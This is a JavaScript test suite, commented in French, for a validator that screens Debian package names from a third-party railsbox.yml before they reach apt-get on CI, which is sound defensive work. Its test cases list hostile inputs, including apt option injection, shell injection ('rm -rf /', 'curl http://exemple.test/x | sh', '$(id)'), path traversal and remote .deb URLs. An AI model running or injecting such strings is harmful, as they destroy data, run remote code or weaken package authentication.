// Frontière de sécurité de la surcouche système (ADR 0006).
//
// Ces noms viennent d'un dépôt TIERS (`system_packages:` de railsbox.yml) et
// finissent en arguments d'un `apt-get install` exécuté sur le runner de CI d'un
// mainteneur. La suite ci-dessous est donc écrite à charge : chaque cas est une
// tentative d'évasion, pas une variation de syntaxe.
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  DEBIAN_PACKAGE_NAME,
  MAX_PACKAGE_NAME_LENGTH,
  MAX_SYSTEM_PACKAGES,
  validateSystemPackages,
} from "../tools/detect/paquets-systeme.mjs";
import { REMEDIES } from "../tools/detect/report.mjs";
import { parseRailsboxYml } from "../tools/detect/manifest.mjs";

/**
 * Raccourci : la liste retenue pour une entrée donnée.
 * @param {readonly string[]|string} entree noms candidats
 * @returns {readonly string[]} noms acceptés
 */
function retenus(entree) {
  return validateSystemPackages(entree).packages;
}

/**
 * Raccourci : les codes de diagnostic émis pour une entrée donnée.
 * @param {readonly string[]|string} entree noms candidats
 * @returns {string[]} codes émis
 */
function codes(entree) {
  return validateSystemPackages(entree).findings.map((finding) => finding.code);
}

test("les noms de paquets Debian légitimes passent", () => {
  // Arrange / Act / Assert : minuscules, chiffres, « + - . », premier
  // caractère alphanumérique — la grammaire de la charte Debian.
  assert.deepEqual(
    [...retenus(["libvips42", "libssl-dev", "g++", "libstdc++6", "python3.11", "ffmpeg"])],
    ["ffmpeg", "g++", "libssl-dev", "libstdc++6", "libvips42", "python3.11"],
  );
});

test("la sortie est triée et dédoublonnée", () => {
  assert.deepEqual(
    [...retenus(["libvips42", "imagemagick", "libvips42"])],
    ["imagemagick", "libvips42"],
  );
});

test("une option apt déguisée en paquet est refusée", () => {
  // C'est LE cas qui compte : sans la contrainte sur le premier caractère,
  // ces valeurs seraient lues par apt-get comme des options.
  for (const hostile of [
    "-o",
    "--allow-unauthenticated",
    "--force-yes",
    "-oAPT::Get::AllowUnauthenticated=true",
    "--option=Dpkg::Options::=--force-confnew",
  ]) {
    assert.deepEqual([...retenus([hostile])], [], `« ${hostile} » a été accepté`);
    assert.deepEqual(codes([hostile]), ["invalid-system-package"]);
  }
});

test("une injection de shell est refusée", () => {
  for (const hostile of [
    "libvips42; rm -rf /",
    "libvips42 && curl http://exemple.test/x | sh",
    "$(id)",
    "`id`",
    "libvips42\nffmpeg",
    "libvips42|tee /etc/passwd",
    "libvips42'",
    'libvips42"',
    "libvips42\\;id",
    "libvips42$IFS",
  ]) {
    // La séparation par espaces d'une chaîne peut produire plusieurs jetons ;
    // aucun ne doit survivre à la validation autre qu'un vrai nom de paquet.
    const gardes = retenus([hostile]);
    assert.equal(gardes.length, 0, `« ${hostile} » a laissé passer ${[...gardes].join(", ")}`);
  }
});

test("un chemin, un fichier .deb ou une URL sont refusés", () => {
  for (const hostile of [
    "/tmp/mechant.deb",
    "./mechant.deb",
    "../../etc/passwd",
    "http://exemple.test/x.deb",
    "libvips42/bookworm-backports",
  ]) {
    assert.deepEqual([...retenus([hostile])], [], `« ${hostile} » a été accepté`);
  }
});

test("une épingle de version ou de dépôt est refusée", () => {
  // apt accepte `paquet=version` et `paquet/suite` : deux façons de tirer un
  // binaire autre que celui de bookworm stable.
  assert.deepEqual([...retenus(["libvips42=8.0.0-1"])], []);
  assert.deepEqual([...retenus(["libvips42/experimental"])], []);
});

test("les majuscules et l'espace sont refusés", () => {
  assert.deepEqual([...retenus(["LibVips42"])], []);
  assert.deepEqual([...retenus(["lib vips"])], []);
  // Un nom d'une seule lettre ne respecte pas la charte Debian (deux minimum).
  assert.deepEqual([...retenus(["a"])], []);
});

test("un nom démesurément long est refusé, et cité tronqué", () => {
  const enorme = `lib${"a".repeat(MAX_PACKAGE_NAME_LENGTH * 2)}`;

  const { packages, findings } = validateSystemPackages([enorme]);

  assert.deepEqual([...packages], []);
  assert.equal(findings[0].code, "invalid-system-package");
  // Le rapport ne doit pas être inondé par la valeur hostile elle-même.
  assert.ok(findings[0].message.length < MAX_PACKAGE_NAME_LENGTH + 200);
});

test("une liste démesurée est refusée en bloc", () => {
  const trop = Array.from({ length: MAX_SYSTEM_PACKAGES + 1 }, (_, index) => `paquet${index}`);

  const { packages, findings } = validateSystemPackages(trop);

  assert.deepEqual([...packages], []);
  assert.deepEqual(
    findings.map((finding) => finding.code),
    ["too-many-system-packages"],
  );
});

test("les entrées vides ou absentes ne produisent ni paquet ni diagnostic", () => {
  for (const vide of [undefined, null, [], "", "   ", ["", "  "]]) {
    const { packages, findings } = validateSystemPackages(vide);
    assert.deepEqual([...packages], []);
    assert.deepEqual([...findings], []);
  }
});

test("un refus est BLOQUANT et porte un remède", () => {
  const { findings } = validateSystemPackages(["--force-yes"]);

  assert.equal(findings[0].severity, "blocking");
  // Un refus sans remède renverrait le mainteneur au code source.
  assert.ok(REMEDIES["invalid-system-package"]);
  assert.ok(REMEDIES["too-many-system-packages"]);
});

test("la grammaire exportée ne colle qu'à des noms Debian", () => {
  assert.ok(DEBIAN_PACKAGE_NAME.test("libvips42"));
  assert.equal(DEBIAN_PACKAGE_NAME.test("-o"), false);
  // Ancrage des deux côtés : sans lui, « x\nrm -rf / » passerait.
  assert.equal(DEBIAN_PACKAGE_NAME.test("libvips42\nrm"), false);
});

// --- Lecture depuis railsbox.yml -------------------------------------------

test("railsbox.yml déclare une surcouche système en liste", () => {
  const { manifest, findings } = parseRailsboxYml("system_packages: [libmagic-dev, ffmpeg]\n");

  assert.deepEqual([...manifest.systemPackages], ["ffmpeg", "libmagic-dev"]);
  assert.deepEqual([...findings], []);
});

test("railsbox.yml accepte un paquet unique sans crochets", () => {
  const { manifest } = parseRailsboxYml("system_packages: libmagic-dev\n");

  assert.deepEqual([...manifest.systemPackages], ["libmagic-dev"]);
});

test("un paquet hostile déclaré dans railsbox.yml bloque l'analyse", () => {
  const { manifest, findings } = parseRailsboxYml(
    'system_packages: [libvips42, "--allow-unauthenticated"]\n',
  );

  // Le nom légitime survit, l'hostile disparaît, et le refus est nommé.
  assert.deepEqual([...manifest.systemPackages], ["libvips42"]);
  assert.equal(findings[0].code, "invalid-system-package");
  assert.equal(findings[0].severity, "blocking");
  // Le diagnostic situe la ligne : un railsbox.yml long serait sinon illisible.
  assert.match(findings[0].message, /ligne 1/);
});
